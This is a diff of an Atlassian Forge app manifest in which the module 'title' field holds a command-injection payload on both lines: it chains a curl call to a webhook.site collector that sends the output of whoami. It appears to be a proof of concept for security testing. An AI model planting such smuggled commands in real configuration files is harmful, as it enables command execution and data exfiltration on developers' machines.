@@ -5,7 +5,7 @@ modules:
       resolver:
         function: resolver
       render: native
-      title: my-test-app && curl https://webhook.site/43c504f4-621f-4f0f-854a-358922aa7238/?data=$(whoami) 
+      title: my-test-app && curl https://webhook.site/5a124560-983e-478e-8b03-0f5e832c026a/?data=$(whoami) 
       icon: https://developer.atlassian.com/platform/forge/images/icons/issue-panel-icon.svg
   function:
     - key: resolver
